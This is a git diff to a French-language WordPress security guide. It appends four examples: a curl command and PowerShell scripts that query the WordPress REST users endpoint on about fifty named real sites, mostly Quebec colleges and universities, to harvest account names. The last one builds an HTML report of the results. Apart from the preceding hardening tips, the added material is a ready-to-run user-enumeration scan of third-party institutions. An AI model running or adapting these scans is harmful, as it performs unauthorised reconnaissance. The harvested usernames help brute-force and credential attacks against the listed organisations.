@@ -225,3 +225,236 @@ La sécurité des sites WordPress est essentielle pour protéger les données se
 - **Mises à jour Régulières :** Toujours maintenir WordPress, les thèmes et les plugins à jour pour corriger les vulnérabilités.
 
 En suivant ces pratiques, les administrateurs peuvent renforcer la sécurité de leurs sites WordPress et protéger les données des utilisateurs.
+
+# Exemple 1
+```ssh
+curl -s https://inkcrown.com/wp-json/wp/v2/users
+```
+# Exemple 2
+
+```ssh
+# Définir les URLs des sites pour les utilisateurs
+$sites = @("https://collegeuniversel.ca/wp-json/wp/v2/users", "https://inkcrown.com/wp-json/wp/v2/users")
+
+# Boucler sur chaque site pour récupérer les données des utilisateurs
+foreach ($site in $sites) {
+    try {
+        # Tenter de récupérer les données utilisateur
+        $users = Invoke-RestMethod -Uri $site -UseBasicParsing
+        # Vérifier si des utilisateurs sont trouvés
+        if ($users.count -gt 0) {
+            Write-Host "Utilisateurs du site $site :"
+            foreach ($user in $users) {
+                Write-Host $user.name
+            }
+        } else {
+            Write-Host "Aucun utilisateur trouvé pour $site."
+        }
+    } catch {
+        Write-Host "Échec de récupération des utilisateurs pour $site : $_"
+    }
+}
+```
+
+# Exemple 3
+```ssh
+# Définir les URLs des sites pour les utilisateurs
+$sites = @(
+    "https://www.crosemont.qc.ca/wp-json/wp/v2/users",
+    "https://www.bdeb.qc.ca/wp-json/wp/v2/users",
+    "https://www.collegecanada.com/wp-json/wp/v2/users",
+    "https://institutelite.ca/wp-json/wp/v2/users",
+    "https://www.lasallecollege.com/wp-json/wp/v2/users",
+    "https://www.johnabbott.qc.ca/wp-json/wp/v2/users",
+    "https://www.dawsoncollege.qc.ca/wp-json/wp/v2/users",
+    "https://www.vaniercollege.qc.ca/wp-json/wp/v2/users",
+    "https://www.claurendeau.qc.ca/wp-json/wp/v2/users",
+    "https://www.cmaisonneuve.qc.ca/wp-json/wp/v2/users",
+    "https://www.collegeahuntsic.qc.ca/wp-json/wp/v2/users",
+    "https://www.cegepsl.qc.ca/wp-json/wp/v2/users",
+    "https://www.cvm.qc.ca/wp-json/wp/v2/users",
+    "https://www.marianopolis.edu/wp-json/wp/v2/users",
+    "https://www.cimf.qc.ca/wp-json/wp/v2/users",
+    "https://www.etsmtl.ca/wp-json/wp/v2/users",
+    "https://www.cegepgarneau.ca/wp-json/wp/v2/users",
+    "https://www.cegeplimoilou.ca/wp-json/wp/v2/users",
+    "https://uqam.ca/wp-json/wp/v2/users",
+    "https://umontreal.ca/wp-json/wp/v2/users",
+    "https://enit.rnu.tn/wp-json/wp/v2/users",
+    "https://www.cegeptr.qc.ca/wp-json/wp/v2/users",
+    "https://www.cegepshawinigan.ca/wp-json/wp/v2/users",
+    "https://www.clafleche.qc.ca/wp-json/wp/v2/users",
+    "https://www.ellis.qc.ca/wp-json/wp/v2/users",
+    "https://www.conservatoire.gouv.qc.ca/wp-json/wp/v2/users",
+    "https://www.cegepst.qc.ca/wp-json/wp/v2/users",
+    "https://www.cegepsth.qc.ca/wp-json/wp/v2/users",
+    "https://www.cegepvalleyfield.ca/wp-json/wp/v2/users",
+    "https://www.cegepmontpetit.ca/wp-json/wp/v2/users",
+    "https://www.cstjean.qc.ca/wp-json/wp/v2/users",
+    "https://www.champlainonline.com/wp-json/wp/v2/users",
+    "https://www.academie-ent.com/wp-json/wp/v2/users",
+    "https://www.airrichelieu.com/wp-json/wp/v2/users",
+    "https://www.april-fortier.com/wp-json/wp/v2/users",
+    "https://www.cdicollege.ca/wp-json/wp/v2/users",
+    "https://www.collegeimmobilier.com/wp-json/wp/v2/users",
+    "https://cargair.com/wp-json/wp/v2/users",
+    "https://www.centreequestredechambly.com/wp-json/wp/v2/users",
+    "https://sainthubertflyingcollege.com/wp-json/wp/v2/users",
+    "https://collegemilestone.ca/wp-json/wp/v2/users",
+    "https://helicraft.ca/wp-json/wp/v2/users",
+    "https://www.teccart.qc.ca/wp-json/wp/v2/users",
+    "https://www.itaq.ca/wp-json/wp/v2/users",
+    "https://www.collegemv.qc.ca/wp-json/wp/v2/users",
+    "https://www.cgodin.qc.ca/wp-json/wp/v2/users",
+    "https://www.grasset.qc.ca/wp-json/wp/v2/users",
+    "https://www.brebeuf.qc.ca/wp-json/wp/v2/users",
+    "https://www.collegedecarie.ca/wp-json/wp/v2/users",
+    "https://www.osullivan.edu/wp-json/wp/v2/users",
+    "https://collegeuniversel.ca/wp-json/wp/v2/users",
+    "https://inkcrown.com/wp-json/wp/v2/users"
+)
+
+# Boucler sur chaque site pour récupérer les données des utilisateurs
+foreach ($site in $sites) {
+    try {
+        # Tenter de récupérer les données utilisateur
+        $users = Invoke-RestMethod -Uri $site -UseBasicParsing
+        # Vérifier si des utilisateurs sont trouvés
+        if ($users.count -gt 0) {
+            Write-Host "Utilisateurs du site $site :"
+            foreach ($user in $users) {
+                Write-Host $user.name
+            }
+        } else {
+            Write-Host "Aucun utilisateur trouvé pour $site."
+        }
+    } catch {
+        Write-Host "Échec de récupération des utilisateurs pour $site : $_"
+    }
+}
+```
+
+
+# Exemple 4
+
+# Définir les URLs des sites pour les utilisateurs
+$sites = @(
+       "https://www.crosemont.qc.ca/",
+       "https://www.bdeb.qc.ca/",
+       "https://www.collegecanada.com/",
+       "https://institutelite.ca/",
+       "https://www.lasallecollege.com/",
+       "https://www.johnabbott.qc.ca/",
+       "https://www.dawsoncollege.qc.ca/",
+       "https://www.vaniercollege.qc.ca/",
+       "https://www.claurendeau.qc.ca/",
+       "https://www.cmaisonneuve.qc.ca/",
+       "https://www.collegeahuntsic.qc.ca/",
+       "https://www.cegepsl.qc.ca/",
+       "https://www.cvm.qc.ca/",
+       "https://www.marianopolis.edu/",
+       "https://www.cimf.qc.ca/",
+       "https://www.etsmtl.ca/",
+       "https://www.cegepgarneau.ca/",
+       "https://www.cegeplimoilou.ca/",
+       "https://uqam.ca/",
+       "https://umontreal.ca/",
+       "https://enit.rnu.tn/",
+       "https://www.cegeptr.qc.ca/",
+       "https://www.cegepshawinigan.ca/",
+       "https://www.clafleche.qc.ca/",
+       "https://www.ellis.qc.ca/",
+       "https://www.conservatoire.gouv.qc.ca/",
+       "https://www.cegepst.qc.ca/",
+       "https://www.cegepsth.qc.ca/",
+       "https://www.cegepvalleyfield.ca/",
+       "https://www.cegepmontpetit.ca/",
+       "https://www.cstjean.qc.ca/",
+       "https://www.champlainonline.com/",
+       "https://www.academie-ent.com/",
+       "https://www.airrichelieu.com/",
+       "https://www.april-fortier.com/",
+       "https://www.cdicollege.ca/",
+       "https://www.collegeimmobilier.com/",
+       "https://cargair.com/",
+       "https://www.centreequestredechambly.com/",
+       "https://sainthubertflyingcollege.com/",
+       "https://collegemilestone.ca/",
+       "https://helicraft.ca/",
+       "https://www.teccart.qc.ca/",
+       "https://www.itaq.ca/",
+       "https://www.collegemv.qc.ca/",
+       "https://www.cgodin.qc.ca/",
+       "https://www.grasset.qc.ca/",
+       "https://www.brebeuf.qc.ca/",
+       "https://www.collegedecarie.ca/",
+       "https://www.osullivan.edu/",
+       "https://collegeuniversel.ca/",
+       "https://inkcrown.com/"
+)
+
+# Initialiser le rapport HTML
+$htmlReport = @"
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Rapport des utilisateurs WordPress</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { border: 1px solid #dddddd; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>Rapport des utilisateurs WordPress</h1>
+    <table>
+        <tr>
+            <th>Site</th>
+            <th>Statut</th>
+            <th>Utilisateurs</th>
+        </tr>
+"@
+
+# Boucler sur chaque site
+foreach ($site in $sites) {
+    $usersList = ""
+    $status = "Accessible"
+    try {
+        $users = Invoke-RestMethod -Uri "$site/wp-json/wp/v2/users" -UseBasicParsing
+        if ($users.count -gt 0) {
+            foreach ($user in $users) {
+                $usersList += $user.name + "<br>"
+            }
+        } else {
+            $usersList = "Aucun utilisateur trouvé"
+        }
+    } catch {
+        $status = "Non accessible (Erreur: $($_.Exception.Message))"
+    }
+
+    # Ajouter les résultats au rapport HTML
+    $htmlReport += @"
+        <tr>
+            <td>$site</td>
+            <td>$status</td>
+            <td>$usersList</td>
+        </tr>
+"@
+}
+
+# Terminer le rapport HTML
+$htmlReport += @"
+    </table>
+</body>
+</html>
+"@
+
+# Enregistrer le rapport HTML dans un fichier
+Set-Content -Path "rapport_utilisateurs.html" -Value $htmlReport
+
+# Ouvrir le rapport dans le navigateur par défaut
+Start-Process "rapport_utilisateurs.html"
+
+
